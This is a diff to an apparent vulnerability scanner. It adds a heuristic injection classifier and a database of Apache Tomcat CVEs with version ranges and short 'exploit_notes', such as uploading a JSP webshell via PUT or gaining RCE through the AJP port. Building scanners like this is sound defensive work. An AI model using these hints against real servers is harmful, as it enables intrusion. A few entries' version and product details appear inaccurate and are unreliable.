+            score = input_count + sink_count
+            if has_sanitization:
+                score *= 0.5  # Reduce score if sanitization present
+            
+            if score > best_score:
+                best_score = score
+                best_match = {
+                    "cwe": cwe,
+                    "cwe_name": f"Generic Detection: {category['type']}",
+                    "owasp": "A03:2021-Injection" if "Injection" in category['type'] else "Unknown",
+                    "severity": category['severity'] if not has_sanitization else "Medium",
+                    "type": category['type'],
+                    "exploit_hints": f"User input detected: {input_count}, Dangerous sinks: {sink_count}",
+                    "cve_examples": [],
+                    "confidence": "medium",
+                    "source": "heuristic_analysis"
+                }
+    
+    # Only return if we have meaningful signals (input + sink)
+    if best_match and input_count > 0 and best_score >= 2:
+        logger.info(f"[HEURISTIC] Generic detection: {best_match['type']} (score: {best_score:.1f})")
+        return best_match
+    
+    return None
+
+
+def classify_with_fallback(code_snippet: str, file_path: str = "") -> Optional[Dict[str, Any]]:
+    """
+    Combined classifier: tries pattern matching first, then heuristic fallback.
+    
+    Returns:
+        Classification dict or None
+    """
+    # Try pattern matching first (highest confidence)
+    result = classify_by_pattern(code_snippet, file_path)
+    if result:
+        return result
+    
+    # Fall back to heuristic analysis (medium confidence)
+    return classify_generic_heuristic(code_snippet, file_path)
 
 class CVEDatabase:
     """
@@ -563,6 +1359,357 @@ class CVEDatabase:
                         "11": "11.0.0 to 11.0.3",
                         "10": "10.1.0 to 10.1.38"
                     }
+                },
+                # ========== TOMCAT 8.5.x CRITICAL CVEs ==========
+                {
+                    "cve_id": "CVE-2020-1938",
+                    "cwe": "CWE-284",
+                    "severity": "Critical",
+                    "cvss": 9.8,
+                    "description": "Ghostcat - AJP Protocol File Read/Include (RCE possible)",
+                    "affected_versions": {
+                        "9": "9.0.0.M1 to 9.0.30",
+                        "8": "8.5.0 to 8.5.50",
+                        "7": "7.0.0 to 7.0.99"
+                    },
+                    "fixed_versions": {
+                        "9": "9.0.31",
+                        "8": "8.5.51",
+                        "7": "7.0.100"
+                    },
+                    "exploit_available": True,
+                    "exploit_notes": "LFI/RCE via AJP port 8009. Read webapp files or achieve RCE if file upload exists.",
+                    "owasp": "A01:2021-Broken Access Control",
+                    "relevant_files": r"server\.xml|ajp|Connector|8009"
+                },
+                {
+                    "cve_id": "CVE-2019-0232",
+                    "cwe": "CWE-78",
+                    "severity": "Critical",
+                    "cvss": 9.8,
+                    "description": "CGI Servlet Command Injection on Windows",
+                    "affected_versions": {
+                        "9": "9.0.0.M1 to 9.0.17",
+                        "8": "8.5.0 to 8.5.39",
+                        "7": "7.0.0 to 7.0.93"
+                    },
+                    "fixed_versions": {
+                        "9": "9.0.18",
+                        "8": "8.5.40",
+                        "7": "7.0.94"
+                    },
+                    "exploit_available": True,
+                    "exploit_notes": "RCE on Windows when CGI servlet enabled. Inject OS commands via CGI args.",
+                    "owasp": "A03:2021-Injection",
+                    "relevant_files": r"CGIServlet|\.bat$|\.cmd$|web\.xml"
+                },
+                {
+                    "cve_id": "CVE-2020-9484",
+                    "cwe": "CWE-502",
+                    "severity": "High",
+                    "cvss": 7.0,
+                    "description": "Session Persistence Deserialization RCE",
+                    "affected_versions": {
+                        "10": "10.0.0-M1 to 10.0.0-M4",
+                        "9": "9.0.0.M1 to 9.0.34",
+                        "8": "8.5.0 to 8.5.54",
+                        "7": "7.0.0 to 7.0.103"
+                    },
+                    "fixed_versions": {
+                        "10": "10.0.0-M5",
+                        "9": "9.0.35",
+                        "8": "8.5.55",
+                        "7": "7.0.104"
+                    },
+                    "exploit_available": True,
+                    "exploit_notes": "RCE via malicious session file when PersistentManager configured. Requires file write access.",
+                    "owasp": "A08:2021-Software and Data Integrity Failures",
+                    "relevant_files": r"PersistentManager|session|context\.xml"
+                },
+                {
+                    "cve_id": "CVE-2017-12617",
+                    "cwe": "CWE-434",
+                    "severity": "Critical",
+                    "cvss": 9.8,
+                    "description": "PUT Method JSP Upload RCE",
+                    "affected_versions": {
+                        "9": "9.0.0.M1 to 9.0.0",
+                        "8": "8.5.0 to 8.5.22",
+                        "7": "7.0.0 to 7.0.81"
+                    },
+                    "fixed_versions": {
+                        "9": "9.0.1",
+                        "8": "8.5.23",
+                        "7": "7.0.82"
+                    },
+                    "exploit_available": True,
+                    "exploit_notes": "Upload JSP shell via PUT when readonly=false. Append / to bypass filter.",
+                    "owasp": "A04:2021-Insecure Design",
+                    "relevant_files": r"web\.xml|DefaultServlet|readonly"
+                },
+                {
+                    "cve_id": "CVE-2017-12615",
+                    "cwe": "CWE-434",
+                    "severity": "Critical",
+                    "cvss": 9.8,
+                    "description": "PUT Method Arbitrary File Upload (Windows)",
+                    "affected_versions": {
+                        "7": "7.0.0 to 7.0.79"
+                    },
+                    "fixed_versions": {
+                        "7": "7.0.81"
+                    },
+                    "exploit_available": True,
+                    "exploit_notes": "RCE on Windows via PUT request to upload JSP webshell when readonly=false.",
+                    "owasp": "A04:2021-Insecure Design",
+                    "relevant_files": r"web\.xml|DefaultServlet|readonly"
+                },
+                {
+                    "cve_id": "CVE-2019-12418",
+                    "cwe": "CWE-287",
+                    "severity": "High",
+                    "cvss": 7.0,
+                    "description": "JMX Authentication Bypass via Local Port",
+                    "affected_versions": {
+                        "9": "9.0.0.M1 to 9.0.28",
+                        "8": "8.5.0 to 8.5.47",
+                        "7": "7.0.0 to 7.0.97"
+                    },
+                    "fixed_versions": {
+                        "9": "9.0.29",
+                        "8": "8.5.48",
+                        "7": "7.0.99"
+                    },
+                    "exploit_available": True,
+                    "exploit_notes": "JMX Remote auth bypass when using local address. Access JMX MBeans without credentials.",
+                    "owasp": "A07:2021-Identification and Authentication Failures"
+                },
+                {
+                    "cve_id": "CVE-2020-8022",
+                    "cwe": "CWE-276",
+                    "severity": "High",
+                    "cvss": 7.8,
+                    "description": "Tomcat Manager Credential Disclosure",
+                    "affected_versions": {
+                        "9": "9.0.0.M1 to 9.0.35",
+                        "8": "8.5.0 to 8.5.55",
+                        "7": "7.0.0 to 7.0.104"
+                    },
+                    "exploit_available": False,
+                    "owasp": "A05:2021-Security Misconfiguration"
+                },
+                {
+                    "cve_id": "CVE-2021-25122",
+                    "cwe": "CWE-200",
+                    "severity": "High",
+                    "cvss": 7.5,
+                    "description": "Request Smuggling via New HTTP/2 Connection",
+                    "affected_versions": {
+                        "10": "10.0.0-M1 to 10.0.0",
+                        "9": "9.0.0.M1 to 9.0.41",
+                        "8": "8.5.0 to 8.5.61"
+                    },
+                    "fixed_versions": {
+                        "10": "10.0.2",
+                        "9": "9.0.43",
+                        "8": "8.5.63"
+                    },
+                    "exploit_available": True,
+                    "exploit_notes": "HTTP Request Smuggling can bypass security controls.",
+                    "owasp": "A03:2021-Injection"
+                },
+                {
+                    "cve_id": "CVE-2021-25329",
+                    "cwe": "CWE-502",
+                    "severity": "High",
+                    "cvss": 7.0,
+                    "description": "Incomplete Fix for Session Deserialization (CVE-2020-9484 variant)",
+                    "affected_versions": {
+                        "10": "10.0.0-M1 to 10.0.0",
+                        "9": "9.0.0.M1 to 9.0.41",
+                        "8": "8.5.0 to 8.5.61",
+                        "7": "7.0.0 to 7.0.107"
+                    },
+                    "fixed_versions": {
+                        "10": "10.0.2",
+                        "9": "9.0.43",
+                        "8": "8.5.63",
+                        "7": "7.0.108"
+                    },
+                    "exploit_available": True,
+                    "exploit_notes": "Extends CVE-2020-9484 attack scenarios.",
+                    "owasp": "A08:2021-Software and Data Integrity Failures"
+                },
+                # ========== TOMCAT 7.x CRITICAL CVEs ==========
+                {
+                    "cve_id": "CVE-2016-8735",
+                    "cwe": "CWE-502",
+                    "severity": "Critical",
+                    "cvss": 9.8,
+                    "description": "JmxRemoteLifecycleListener Deserialization RCE",
+                    "affected_versions": {
+                        "9": "9.0.0.M1 to 9.0.0.M11",
+                        "8": "8.0.0.RC1 to 8.5.6",
+                        "7": "7.0.0 to 7.0.72",
+                        "6": "6.0.0 to 6.0.47"
+                    },
+                    "fixed_versions": {
+                        "9": "9.0.0.M13",
+                        "8": "8.5.8",
+                        "7": "7.0.73",
+                        "6": "6.0.48"
+                    },
+                    "exploit_available": True,
+                    "exploit_notes": "RCE via JMX listener. Requires JmxRemoteLifecycleListener in server.xml.",
+                    "owasp": "A08:2021-Software and Data Integrity Failures",
+                    "relevant_files": r"JmxRemoteLifecycleListener|server\.xml|jmx"
+                },
+                {
+                    "cve_id": "CVE-2016-5018",
+                    "cwe": "CWE-284",
+                    "severity": "Critical",
+                    "cvss": 9.1,
+                    "description": "Security Manager Bypass via Webapp ResourceLink",
+                    "affected_versions": {
+                        "9": "9.0.0.M1 to 9.0.0.M9",
+                        "8": "8.0.0.RC1 to 8.5.4",
+                        "7": "7.0.0 to 7.0.70",
+                        "6": "6.0.0 to 6.0.45"
+                    },
+                    "exploit_available": True,
+                    "exploit_notes": "Bypass SecurityManager via ResourceLinkFactory.",
+                    "owasp": "A01:2021-Broken Access Control"
+                },
+                {
+                    "cve_id": "CVE-2014-0050",
+                    "cwe": "CWE-400",
+                    "severity": "High",
+                    "cvss": 7.5,
+                    "description": "Apache Commons FileUpload DoS (affects Tomcat)",
+                    "affected_versions": {
+                        "8": "8.0.0-RC1 to 8.0.1",
+                        "7": "7.0.0 to 7.0.51"
+                    },
+                    "fixed_versions": {
+                        "8": "8.0.2",
+                        "7": "7.0.52"
+                    },
+                    "exploit_available": True,
+                    "exploit_notes": "DoS via multipart request boundary parsing.",
+                    "owasp": "A05:2021-Security Misconfiguration"
+                },
+                {
+                    "cve_id": "CVE-2014-0119",
+                    "cwe": "CWE-200",
+                    "severity": "Medium",
+                    "cvss": 5.3,
+                    "description": "XSLT Information Disclosure",
+                    "affected_versions": {
+                        "8": "8.0.0-RC1 to 8.0.5",
+                        "7": "7.0.0 to 7.0.53",
+                        "6": "6.0.0 to 6.0.40"
+                    },
+                    "exploit_available": False,
+                    "owasp": "A01:2021-Broken Access Control"
+                },
+                {
+                    "cve_id": "CVE-2016-0714",
+                    "cwe": "CWE-284",
+                    "severity": "Critical",
+                    "cvss": 9.8,
+                    "description": "Session Manager Auto Deploy Remote Code Execution",
+                    "affected_versions": {
+                        "9": "9.0.0.M1 to 9.0.0.M1",
+                        "8": "8.0.0.RC1 to 8.0.30",
+                        "7": "7.0.0 to 7.0.67",
+                        "6": "6.0.0 to 6.0.44"
+                    },
+                    "fixed_versions": {
+                        "9": "9.0.0.M3",
+                        "8": "8.0.32",
+                        "7": "7.0.68",
+                        "6": "6.0.45"
+                    },
+                    "exploit_available": True,
+                    "exploit_notes": "RCE via malicious session + Manager app privileges.",
+                    "owasp": "A01:2021-Broken Access Control"
+                },
+                {
+                    "cve_id": "CVE-2016-3092",
+                    "cwe": "CWE-400",
+                    "severity": "High",
+                    "cvss": 7.5,
+                    "description": "Apache Commons FileUpload DoS (MIME boundary)",
+                    "affected_versions": {
+                        "9": "9.0.0.M1 to 9.0.0.M8",
+                        "8": "8.0.0.RC1 to 8.5.3",
+                        "7": "7.0.0 to 7.0.69"
+                    },
+                    "fixed_versions": {
+                        "9": "9.0.0.M10",
+                        "8": "8.5.4",
+                        "7": "7.0.70"
+                    },
+                    "exploit_available": True,
+                    "exploit_notes": "CPU exhaustion DoS via crafted MIME boundary.",
+                    "owasp": "A05:2021-Security Misconfiguration"
+                },
+                # ========== EL INJECTION (Common in Tomcat webapps) ==========
+                {
+                    "cve_id": "CVE-2014-0094",
+                    "cwe": "CWE-917",
+                    "severity": "Critical",
+                    "cvss": 9.8,
+                    "description": "ClassLoader Manipulation via ParametersInterceptor (Struts2/Tomcat)",
+                    "affected_versions": {
+                        "8": "8.0.0 to 8.5.99",
+                        "7": "7.0.0 to 7.0.99"
+                    },
+                    "exploit_available": True,
+                    "exploit_notes": "Manipulate ClassLoader properties for RCE (commonly on Tomcat).",
+                    "owasp": "A03:2021-Injection",
+                    "relevant_files": r"struts|ParametersInterceptor|Action\.java"
+                },
+                {
+                    "cve_id": "CVE-2018-1305",
+                    "cwe": "CWE-284",
+                    "severity": "Medium",
+                    "cvss": 6.5,
+                    "description": "Security Constraint Bypass via URL Mapping",
+                    "affected_versions": {
+                        "9": "9.0.0.M1 to 9.0.5",
+                        "8": "8.5.0 to 8.5.27",
+                        "8.0": "8.0.0.RC1 to 8.0.50",
+                        "7": "7.0.0 to 7.0.85"
+                    },
+                    "fixed_versions": {
+                        "9": "9.0.6",
+                        "8": "8.5.28",
+                        "7": "7.0.86"
+                    },
+                    "exploit_available": True,
+                    "exploit_notes": "Bypass security constraints in web.xml via URL mangling.",
+                    "owasp": "A01:2021-Broken Access Control"
+                },
+                {
+                    "cve_id": "CVE-2018-11784",
+                    "cwe": "CWE-601",
+                    "severity": "Medium",
+                    "cvss": 4.3,
+                    "description": "Open Redirect when Default Servlet handles redirect",
+                    "affected_versions": {
+                        "9": "9.0.0.M1 to 9.0.11",
+                        "8": "8.5.0 to 8.5.33",
+                        "7": "7.0.23 to 7.0.90"
+                    },
+                    "fixed_versions": {
+                        "9": "9.0.12",
+                        "8": "8.5.34",
+                        "7": "7.0.91"
+                    },
+                    "exploit_available": True,
+                    "exploit_notes": "Redirect users to malicious site.",
+                    "owasp": "A01:2021-Broken Access Control"
                 }
             ]
         }
